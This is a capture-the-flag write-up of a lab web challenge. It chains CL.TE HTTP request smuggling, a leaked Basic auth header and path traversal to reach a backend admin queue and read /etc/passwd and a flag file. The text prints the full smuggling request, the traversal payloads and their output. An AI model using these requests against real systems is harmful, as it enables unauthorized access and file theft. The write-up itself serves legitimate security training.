# TeamShelf Edge Writeup

| Field | Value |
|---|---|
| Category | Web |
| Difficulty | Hard |
| Main bug | CL.TE HTTP request smuggling |
| Impact | Backend-only admin access, credential leak, path traversal to `/home/local.txt` |
| Tools used | Browser, Burp Suite, ffuf, Python smuggler helper script |

## Overview

TeamShelf is a shared storage workspace for internal teams. The public app exposes object downloads, sync health checks, and a PDF-only document intake form.

The solve chain is:

1. Enumerate the public app and identify the upload workflow.
2. Trigger an upload rejection that reveals the admin review queue.
3. Confirm `/admin` is blocked by the edge gateway.
4. Notice the app has an HTTP/1.1 keep-alive backend path.
5. Use CL.TE request smuggling to reach the backend-only admin queue.
6. Recover an archived Basic authorization header from the admin queue.
7. Fuzz the archive endpoint parameter and find `filename`.
8. Use path traversal in `/admin/archive?filename=...` to read `/home/local.txt`.

![TeamShelf attack kill chain](images/image-1.png)

## Target Layout

The deployment has a public edge gateway in front of an internal object service. Only the edge is reachable from outside; the object service is reachable through the edge-to-backend connection.

![TeamShelf infrastructure](images/image.png)

## Enumeration

The landing page shows recent operational documents and published object paths.

![TeamShelf homepage](images/03-teamshelf-homepage.png)

Downloading the engineering onboarding object returns a text file:

```http
GET /download?id=teams/engineering/onboarding.txt HTTP/1.1
Host: <host>:<port>
```

![Valid public download in Burp](images/02-valid-download-burp.png)

Directory fuzzing with a local wordlist found `/upload`. The challenge does not provide a wordlist; players bring their own.

```bash
ffuf -u "http://<host>:<port>/FUZZ" -w common.txt
```

![ffuf upload discovery](images/01-ffuf-upload-discovery.png)

Traversal through the public download route returns a generic missing-object error:

```http
GET /download?id=../../../../etc/passwd HTTP/1.1
Host: <host>:<port>
```

![Public download traversal blocked](images/04-public-download-traversal-blocked.png)

The next target is the document intake form.

## Upload Review Clue

The upload form accepts retention PDFs. A `.pdf` filename with non-PDF content returns:

```json
{
  "error": "upload rejected",
  "notice": "Suspicious files are routed to the Admin Review queue: /admin?queue=upload-review"
}
```

![Upload rejection points to admin review](images/05-upload-rejection-admin-review.png)

Target route: `/admin?queue=upload-review`.

## Edge Block

Requesting the admin queue directly returns a 404 from the edge gateway:

```http
GET /admin?queue=upload-review HTTP/1.1
Host: <host>:<port>
Connection: close
```

```text
HTTP/1.1 404 Not Found
Server: TeamShelf-Edge/4.18
```

![Direct admin blocked by edge](images/06-direct-admin-edge-404.png)

Direct admin access is blocked at the edge.

## Smuggling Primitive

The health endpoint is served by the object service and shows an HTTP/1.1 keep-alive upstream:

```json
{
  "backend": "obj-eu-archive-03",
  "edge": "cache-warm",
  "status": "ok",
  "upstream": "http/1.1 keep-alive"
}
```

The edge uses `Content-Length` to decide how much request body to forward. The backend honors `Transfer-Encoding: chunked`.

I used a Python smuggler helper script to keep request order stable and calculate the outer `Content-Length`:

```bash
python3 teamshelf-smuggler.py send "http://<host>:<port>" \
  "/admin?queue=upload-review" \
  --show-first --print-request
```

The generated CL.TE request has this shape:

```http
POST /upload HTTP/1.1
Host: <host>:<port>
Content-Type: application/x-www-form-urlencoded
Content-Length: <computed-body-length>
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin?queue=upload-review HTTP/1.1
Host: <host>:<port>
Connection: keep-alive

```

The helper then sends a normal trigger request:

```http
GET /api/health HTTP/1.1
Host: <host>:<port>
Connection: close

```

Trigger-only request before smuggling:

![Empty trigger before smuggling](images/07-burp-trigger-tab-empty.png)

Wrong body length or broken connection ordering:

![Wrong CL.TE attempt returns upload rejection](images/08-burp-smuggle-attempt-wrong-length.png)

Turbo Intruder test returning only `/api/health`:

![Turbo Intruder health response during testing](images/09-turbo-intruder-health-not-smuggled.png)

## Admin Queue

Correct CL.TE alignment returns the backend-only admin page.

![Smuggled admin queue leaks archived header](images/10-smuggled-admin-header-leak.png)

The queue page contains a restore-runner note with a legacy connector header still attached:

```html
<h1>Upload Review Queue</h1>
<code>Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2</code>
<code>GET /admin/archive</code>
```

![Smuggling proof with admin response](images/11-smuggling-proof-admin-response.png)

Progressive validation with the Python helper:

```bash
python3 teamshelf-smuggler.py send "http://<host>:<port>" "/admin" --show-first
python3 teamshelf-smuggler.py send "http://<host>:<port>" "/admin?queue=upload-review" --show-first
```

```text
/admin                         -> admin queue not found
/admin?queue=upload-review     -> admin review queue page
```

![Smuggler admin and queue validation](images/13-smuggler-admin-and-queue.png)

The leaked header is part of the archive-history note left behind during a restore migration.

## Archive Endpoint

The admin page points to `/admin/archive`, and the leaked header is required:

```http
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
```

Without the right selector parameter, the endpoint returns:

```json
{
  "error": "missing filename"
}
```

The parameter name is not shown in the page. Tested common names such as `file`, `path`, `object`, `key`, `id`, and `filename`.

The Python helper supports the same check with a player-supplied wordlist:

```bash
python3 teamshelf-smuggler.py fuzz "http://<host>:<port>" burp-parameter-names.txt --value test.txt
```

Using `id` does not change the backend error:

```http
GET /admin/archive?id=test.txt HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

```json
{
  "error": "missing filename"
}
```

Using `filename` changes the behavior to an object lookup:

```http
GET /admin/archive?filename=test.txt HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

```json
{
  "error": "archive object not found",
  "filename": "test.txt"
}
```

Parameter: `filename`.

![Archive parameter discovery](images/14-smuggler-archive-param-discovery.png)

## File Read

Classic Linux file-read check:

```http
GET /admin/archive?filename=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

Public `/download` traversal failed earlier. Backend archive traversal:

![Traversal attempt blocked outside archive reader](images/12-traversal-etc-passwd-not-found.png)

The smuggled archive request returns `/etc/passwd`:

```text
root:x:0:0:root:/root:/usr/sbin/nologin
nobody:x:65532:65532:TeamShelf runtime user:/nonexistent:/usr/sbin/nologin
teamshelf:x:1000:1000:TeamShelf service account:/srv/teamshelf:/usr/sbin/nologin
```

![Successful passwd traversal](images/15-smuggler-etc-passwd.png)

Final target:

```http
GET /admin/archive?filename=..%2F..%2F..%2Fhome%2Flocal.txt HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

```text
SECdojo{...}
```

![Final flag read](images/16-smuggler-final-flag.png)

## Flag

The flag is the content of:

```text
/home/local.txt
```

## Attack Path Summary

- `/admin` is discovered from the upload-review business flow.
- Direct admin access is blocked by the edge.
- CL.TE desync reaches the backend-only admin queue.
- The admin queue leaks an archived restore connector header.
- The archive reader path traversal reads `/home/local.txt`.
